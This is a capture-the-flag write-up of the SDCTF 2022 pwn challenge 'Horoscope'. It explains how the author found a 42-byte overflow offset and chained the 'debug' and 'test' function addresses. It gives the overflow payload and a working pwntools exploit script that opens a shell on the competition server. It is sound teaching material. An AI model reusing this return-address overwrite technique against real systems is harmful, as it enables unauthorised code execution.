---
layout: load_md
title: The White Circle | Sdctf 2022 | Horoscope Writeup
desc: Check out our writeup for Horoscope for Sdctf 2022 capture the flag competition.
image: images/twc_og_banner.jpg
ctf: Sdctf 2022
parent: sdctf_2022
category: pwn
challenge: Horoscope
tags: "pwn, taz"
date: 2022-05-10T00:00:00+00:00
last_modified_at: 2022-05-10T00:00:00+00:00
---


> Solved by: Taz34

Here we have a binary so the first thing i started to look for is to get a segmentation fault and we got it.


![](https://i.imgur.com/DQB46Va.png)


Now I started looking for offset so the offset multiple to be added is 42 
i.e.
 

    python3 -c "print('10/10/1999/10:' + '1'*42)"
    Hence the payload is: 10/10/1999/10:111111111111111111111111111111111111111111

Now we started looking at Ghidra, and we found a function “test” from which we can get a shell on target.

![](https://i.imgur.com/2LPxEzD.png)


here we have a problem that we need to make this (temp == 1) conditon true.
So, after going to other functions we found another function “debug”

![](https://i.imgur.com/NWfIhEj.png)


Now we can construct the final payload as:

    payload = b"01/01/2001/01:111111111111111111111111111111111111111111" + debug_fun_addr  + test_fun_addr

hence the final script:

    from pwn import *
    
    p = remote("horoscope.sdc.tf", 1337)
    
    payload = b"01/01/2001/01:111111111111111111111111111111111111111111" + p64(0x40096e) +p64(0x400950)
    
    p.sendline(payload)
    
    p.interactive()

now just execute this script to get the flag

![](https://i.imgur.com/QlX6mYU.png)

    Flag: sdctf{S33ms_y0ur_h0rO5c0p3_W4s_g00d_1oD4y}

